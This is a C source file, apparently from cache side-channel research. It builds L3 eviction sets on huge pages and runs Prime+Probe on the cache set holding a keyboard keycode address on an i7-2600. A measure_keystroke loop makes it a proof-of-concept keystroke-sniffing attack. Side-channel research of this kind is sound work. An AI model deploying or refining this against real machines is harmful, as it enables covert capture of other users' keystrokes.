#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#include "../lib/constants.h"
#include "../lib/eviction.h"
#include "../lib/l3pp.h"
#include "../lib/utils.h"

#define TRIALS 1000

void *mapping_start;
EvictionSet **es_list;
unsigned int core_id = 0;
FILE *file;

void cleanup(EvictionSet **es_listl, void *mapping_start, FILE *file) {
  fclose(file);
  free_es_list(es_list);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}
void handle_sigint(int sig) {
  safe_print("SIGINT received, cleanup process initiated\n");
  cleanup(es_list, mapping_start, file);
  exit(1);
}

void test_eviction_set(void) {
  uint8_t victim = 0x37;
  CacheLineSet *cl_set = new_cl_set();

  uint64_t threshold = threshold_from_flush(&victim);
  if (!get_minimal_set(&victim, &cl_set, threshold)) {
    printf("Error. Failed to generate minimal eviction set.\n");
  }

  // Bring the victim into the cache
  uint8_t var2 = victim ^ 0xF7;

  // Access eviction set
  NumList *timings = new_num_list(TRIALS);
  evict_and_time(cl_set, &victim, timings, true);

  // Report median and mean times
  printf("Timings after accessing eviction set:\n");
  print_stats(timings);

  int evictions = 0;

  for (int i = 0; i < TRIALS; i++) {
    if (timings->nums[i] > threshold) {
      evictions++;
    }
  }

  printf("Successfully evicted %u/%u trials.\n", evictions, TRIALS);

  deep_free_cl_set(cl_set);
  free_num_list(timings);
}

void test_eviction_and_pp(void) {
  uint8_t *target = malloc(sizeof(uint8_t *));
  printf("target: %p\n", target);
  uintptr_t pa = pointer_to_pa(target);

  // map 64 2 MB pages to ge 256 candidate lines
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }

  printf("memory mapped: %p\n", mapping_start);

  int threshold = threshold_from_flush(target);

  CacheLineSet *cl_set;
  if (!get_minimal_set(target, &cl_set, threshold)) {
    printf("unable to obtain eviction set\n");
  }

  for (int i = 0; i < cl_set->size; i++) {
    printf("%p\n", cl_set->cache_lines[i]);
  }

  EvictionSet *es = new_eviction_set(cl_set);
  uint64_t time = evict_and_time_once(es, target);
  printf("threshold: %d, evict_time: %ld\n", threshold, time);

  sleep(1);

  access_set(es);
  volatile uint8_t tmp = *target;
  int list[16];
  probe(es, threshold);

  sleep(1);
  access_set(es);
  probe(es, threshold);

  free(target);
  deep_free_es(es);
  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
}

void init_mapping() {
  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
  if (mapping_start == MAP_FAILED) {
    perror("map");
    return;
  }
}

void test_find_all_eviction_sets(int set) {
  printf("set: %d\n", set);

  es_list = get_all_slices_eviction_sets(mapping_start, set);

  for (int i = 0; i < 4; i++) {
    printf("Eviction Set %d: \n", i);
    print_eviction_set(es_list[i]->cache_lines);
  }
}

int get_evset_index(int slice) {
  int ret = -1;
  for (int i = 0; i < 4; i++) {
    CacheLine *iter = es_list[i]->head;
    if (slice == get_i7_2600_slice(pointer_to_pa((void *)iter))) {
      ret = i;
    }
  }
  return ret;
}

int profile_slices(int set) {
  test_find_all_eviction_sets(set);

  sleep(5);
  int slice_hit_count[4];
  uint8_t hit_times[1024 * 1024];
  for (int i = 0; i < 4; i++) {
    int slice = get_i7_2600_slice(pointer_to_pa((void *)es_list[i]->head));
    printf("testing slice index: %d\n", slice);
    uint64_t start_time;
    prime_probe(es_list[i], EVERGLADES_ASSOCIATIVITY, hit_times, 1024 * 1024,
                &start_time);
    print_probe_result(hit_times, 1024 * 1024, 64, 64);
  }

  int max_hit_count = slice_hit_count[0];
  int max_slice_index = 0;
  for (int i = 0; i < 4; i++) {
    if (slice_hit_count[i] > max_hit_count) {
      max_hit_count = slice_hit_count[i];
      max_slice_index = i;
    }
  }
  return max_slice_index;
}

void measure_keystroke() {
  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
  int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
  int eslist_index = get_evset_index(slice);
  while (1) {
    uint8_t probemap[1024 * 1024];
    uint64_t start;
    prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY, probemap,
                1024 * 1024, &start);
  }
}

int main() {
  // test_eviction_set();
  // test_covert_channel();
  // test_eviction_and_pp();
  signal(SIGINT, handle_sigint);
  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
  init_mapping();
  int target_slice = profile_slices(set);
  printf("target slice: %d\n", target_slice);
  return 0;
}
